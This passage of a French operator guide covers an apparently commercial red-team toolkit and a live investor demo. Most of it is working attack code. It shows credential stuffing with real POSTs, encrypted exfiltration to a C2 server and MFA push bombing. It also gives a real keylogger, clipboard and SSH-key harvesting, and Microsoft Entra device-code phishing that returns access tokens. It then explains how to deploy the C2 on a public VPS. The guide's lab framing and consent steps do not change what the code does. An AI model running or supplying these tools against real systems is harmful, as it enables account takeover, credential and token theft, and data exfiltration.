LABC2_ACCEPT_AFTER_N=3 \
.venv/bin/python c2/lab_c2_server.py 8099
```

| Endpoint | Effet réel |
|---|---|
| `POST /ingest` | stuffing → 200/401/423/429 selon les listes ci-dessus |
| `POST /exfil` | réception des blobs AES-256-GCM (`exfil_<session>.jsonl`) |
| `POST /push` | MFA push → `allow` à partir du N-ième (`ACCEPT_AFTER_N`) |
| `GET /health` | compteurs + config |

Artefacts : `captures/lab_c2/*.jsonl`.

### 15.3 Credential stuffing réel (POST httpx)

```python
from attack.credential_stuffing.sprayer import (
    CredentialPair, CredentialStuffingEngine, RealLoginTarget)

target = RealLoginTarget(url="http://127.0.0.1:8099/ingest", method="json",
                         user_field="user", password_field="password")
eng = CredentialStuffingEngine(real=True, real_login_target=target, proxy_pool=None)
rep = eng.run_credential_stuffing([
    CredentialPair(username="alice@corp.local", password="Spring2026!"),
    CredentialPair(username="locked@corp.local", password="Whatever1!")],
    simulated=True)  # simulated=True = pas d'attentes throttler ; les POST sont RÉELS
```

Validé live : 4 POST → **2 hits réels + 1 compte verrouillé (423)**,
chaque requête retrouvée dans `captures/lab_c2/stuffing.jsonl`.
Pour une vraie cible web : `RealLoginTarget(url="https://cible/login", method="form",
success_codes=(302,), failure_codes=(200,))` — codes personnalisables.

### 15.4 Exfiltration réelle chiffrée + déchiffrement côté récepteur

```python
from attack.post_exploitation.exfil import (
    DataExfiltrator, StagedFile, decrypt_exfil_blob)

ex = DataExfiltrator(destination="http://127.0.0.1:8099/exfil",
                     output_path="captures/lab_c2/op.bin.enc")
ex.exfil_files([StagedFile(path="document.txt")])  # AES-256-GCM réel
ex.send_real()                                      # POST HTTP réel de chaque blob
# Côté C2 : decrypt_exfil_blob(ex.session_key_b64, nonce_b64, ct_b64)
#           → octets identiques, sha256 vérifié
```

Validé live : 73 octets chiffrés → POST → réception → déchiffrement
**identique octet par octet** (SHA-256 vérifié des deux côtés).

### 15.5 MFA bombing réel (HTTP) avec stop-on-accept

```python
from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
camp = MFABombingEngine().start_campaign(
    target=MFATarget.MICROSOFT_ENTRA, username="victim@corp.local",
    interval_seconds=0.05, max_attempts=60,
    push_url="http://127.0.0.1:8099/push", real=True)
# Le serveur qui répond {"decision":"allow"} simule l'acceptation victime :
# l'attaque s'arrête AUSSI TÔT (OPSEC), vérifié : allow au push #3 → 3 pushes au total.
```

### 15.6 Tunnel WebSocket réel

```python
import asyncio
from attack.ws_smuggling.smuggler import WSSmugglingTunnel
tun = WSSmugglingTunnel()
cfg = tun.create_tunnel(ws_url="ws://127.0.0.1:8765/ws")
res = asyncio.run(tun.roundtrip_real(cfg.tunnel_id, b"beacon + exfil"))
# res["data"] == b"beacon + exfil" (écho réel, journalisé in/out dans ws_traffic.jsonl)
```

Note OPSEC : le subprotocol n'est annoncé au handshake que s'il diffère du
mimétisme par défaut (`graphql-ws`) — sinon le handshake réel échoue contre
un serveur qui ne le négocie pas.

### 15.7 Post-exploitation réelle sur la machine (cadre autorisé)

```python
from attack.post_exploitation.exfil import CloudKeylogger, ClipboardStealer
from attack.token_harvester.harvester import TokenHarvester, TokenSource

# Vraies frappes clavier (T1056.001) — macOS : accorder "Input Monitoring"
chunks = CloudKeylogger().start_real(duration_s=30)

# Vrai presse-papier (T1115)
snap = ClipboardStealer().capture_real()   # patterns IBAN/CB/password détectés

# Vrai filesystem (T1552/T1018) — ne rapporte QUE ce qui existe
h = TokenHarvester(mode="real")
toks = h.harvest_from_source(TokenSource.SSH_KEYS)   # clés privées + known_hosts
TokenHarvester.enumerate_real_sources()              # inventaire FS réel
```

Validé live sur la machine de labo : presse-papier réel lu (67 caractères +
patterns IBAN/CB), listener pynput démarré (la livraison des touches exige la
permission macOS *Input Monitoring* — sans elle, erreur TCC documentée au
§15.9), et **3 hôtes SSH réels** extraits de `known_hosts`
(`54.88.205.84`, `18.232.162.57`, `localhost.run`) puis exfiltrés en JSONL.
Navigateurs/cloud CLI absents de la machine → **0 token inventé**, l'outil
rapporte zéro plutôt que de simuler.

### 15.8 Device Code réel (RFC 8628, Microsoft Entra)

```python
from attack.device_code.initiator import DeviceCodeInitiator
from attack.device_code.poller import DeviceCodePoller

flow = DeviceCodeInitiator().initiate_real(scope="openid profile offline_access")
print(flow.user_code, flow.verification_uri)   # code officiel Microsoft
result = __import__("asyncio").run(
    DeviceCodePoller(flow).poll_real(max_wait_s=900))
# Dès que la victime entre le code → access_token + refresh_token RÉELS
```

Validé live : initiation réelle (`user_code`, `expires_in=900`) + polling réel
(`authorization_pending` conforme RFC 8628, jamais `authorized` sans la victime).

### 15.9 C2 Go (contournement) + dépannage du réel

- **C2 Go (`c2/main.go`) : build impossible** — aucune toolchain Go sur la
  machine. Le serveur C2 **réel** de remplacement est `c2/lab_c2_server.py`
  (§15.2, Python stdlib, zéro dépendance). Pour compiler le beacon Go un jour :
  `brew install go && go build -o c2/beacon c2/main.go`.
- **Keylogger réel → erreur TCC** : `This process is not trusted! Input event
  monitoring will not be possible` → macOS : Réglages → Confidentialité →
  **Input Monitoring** → autoriser le terminal/Python, puis relancer.
- **AiTM httpx 0.28+** : le kwarg `http3` n'existe plus ; le proxy construit
  ses clients dynamiquement (`_http3_supported()`), ne forcez rien.
- **Test rapide de bout en bout** : `pytest test_real_mode.py -v` doit rester
  `6 passed` — sinon un prérequis réseau/outillage a changé.

---

## 16. LE JOUR J : projection live, volontaires, réseau externe

### 16.1 L'écran de projection (le public n'a besoin de RIEN d'autre)

Le C2 sert lui-même un **dashboard temps réel** : ouvrez simplement

```
http://IP-DU-C2:PORT/dashboard
```

dans n'importe quel navigateur (vidéoprojecteur, téléphone d'un investisseur
à l'autre bout du monde). Y défilent en direct : chaque POST de stuffing avec
son verdict HTTP (HIT rouge / LOCKED orange / refusé gris), les exfiltrations
chiffrées reçues, la saga MFA (deny → deny → ALLOW), les volontaires qui
s'inscrivent, et — crucial pour vendre la suite — le **panneau bleu
« Détections Blue Team »** qui s'allume PENDANT l'attaque :
`brute_force_pattern`, `credential_compromise`, `exfiltration_channel`,
`mfa_push_storm`, avec scores.

Le dashboard se reconnecte tout seul (wifi instable) et rejoue l'historique
de ce qu'il a manqué (`/events` garde les 2000 derniers événements).

### 16.2 Volontaires du public (légal, spectaculaire)

1. Le C2 affiche un **QR code** (dans la sortie de la démo) pointant vers
   `http://IP-DU-C2:PORT/join`.
2. Le volontaire scanne depuis son téléphone, choisit un **pseudo à l'écran**,
   laisse son e-mail de contact (jamais affiché) et **coche le consentement**
   explicite : il comprend qu'une identité de LABO éphémère est créée pour
   lui, dans votre infrastructure, et que seul ce compte de labo sera ciblé.
3. Sa véritable identité et son téléphone ne sont JAMAIS attaqués —
   aucune loi ne permet de les toucher sans autorisation écrite spécifique.
4. La démo compromise ensuite SON identité de labo en direct : son pseudo
   apparaît à l'écran, HIT rouge, mot de passe affiché, push MFA qui cède.
5. Un pseudo commençant par `locked.` (ex: `locked_steph`) est volontairement
   VERROUILLÉ (HTTP 423) — idéal pour montrer le lockout à l'écran.
6. Les inscriptions sont journalisées dans `captures/lab_c2/volunteers.jsonl`
   (traçabilité du consentement) et les pseudos s'effacent au redémarrage.

### 16.3 Scénario « même salle » (wifi/LAN)

```bash
# Machine A (n'importe quel laptop avec Python 3) :
LABC2_BIND=0.0.0.0 LABC2_ACCEPT_USERS='alice@corp.local,bob@corp.local' \
LABC2_LOCK_USERS='locked@corp.local' LABC2_ACCEPT_AFTER_N=3 \
python3 c2/lab_c2_server.py 8099

# Machine de scène :
make demo-real ARGS="--c2 http://IP-DE-A:8099"
# Projection : http://IP-DE-A:8099/dashboard
```

### 16.4 Scénario « réseau externe » (VPS ~5 €, pas le même réseau, vraiment)

```bash
# 1) Louer un VPS (OVH/Hetzner/Scaleway, Ubuntu 24.04, 15 minutes) puis :
ssh root@IP_VPS
apt update && apt install -y python3 && mkdir -p /opt/demo
exit

# 2) Copier UN SEUL fichier (le C2 est autonome, zéro dépendance) :
scp c2/lab_c2_server.py root@IP_VPS:/opt/demo/

# 3) Sur le VPS — lancer + ouvrir le port :
ssh root@IP_VPS
cd /opt/demo
LABC2_BIND=0.0.0.0 LABC2_TOKEN='un-secret-long' \
LABC2_ACCEPT_USERS='alice@corp.local,bob@corp.local' \
LABC2_LOCK_USERS='locked@corp.local' LABC2_ACCEPT_AFTER_N=3 \
nohup python3 lab_c2_server.py 8099 > c2.log 2>&1 &
ufw allow 8099/tcp   # (ou l'équivalent dans la console du fournisseur)

# 4) Depuis la scène (n'importe où dans le monde) :
VANTABLACK_C2_TOKEN='un-secret-long' \
make demo-real ARGS="--c2 http://IP_VPS:8099"

# 5) Projection (et les investisseurs, chez eux, ouvrent la même URL) :
#    http://IP_VPS:8099/dashboard
```

Le token (`LABC2_TOKEN` / `VANTABLACK_C2_TOKEN`) protège l'ingestion :
sans lui, `/ingest`, `/exfil`, `/push` et `/announce` répondent 401.
Le dashboard et l'inscription volontaires restent publics (c'est le but).

### 16.5 Anti-flop : ce qui est déjà blindé

- **Pre-flight automatique** : si le C2 distant n'accepte pas les identités
  de test, la démo échoue EN 3 SECONDES à l'étape 1 en affichant la commande
  exacte à relancer sur la machine du C2 (testé : c'est ce qui sauve la démo
  quand la machine A est mal configurée).
- **Readiness** : C2 injoignable (pare-feu, bind oublié) → diagnostic clair
  en < 10 s au lieu d'un terminal suspendu.
- **Plan B instantané** : sans `--c2`, la démo démarre son propre C2 local —
  zéro réseau requis, 7/7 hors ligne (c'est le repli si le wifi de la salle
  est hostile).
- **Reprise SSE** : le dashboard rattrape automatiquement tout ce qu'il a
  manqué pendant une coupure.
- **Répétition** : jouez la démo complète 2× avant le jour J, y compris via
  le VPS. La stabilité 3×/3× a été validée sur la config locale.
- **Légal** : pas un seul paquet vers un vrai compte tiers. Toutes les
  cibles sont vos identités de labo ou celles des volontaires consentants.
  C'est ce qui permet de dire sur scène « tout est réel » sans risque.

### 16.6 Le pitch qui vend la défense

À la fin de la démo, montrez le panneau bleu : chaque attaque rouge a sa
contre-mesure bleue détectée en direct. La Phase 2 (calibrage des détecteurs
`blue_team/` sur ces artefacts, tests Red vs Blue) transforme ce show en
produit. *L'attaque fait lever les sourcils ; les détections font signer.*

---

*Guide généré dans le cadre d'un audit de sécurité autorisé. Usage sur
des systèmes sans autorisation = délit (France : art. 323-1 et suivants
du Code pénal).*
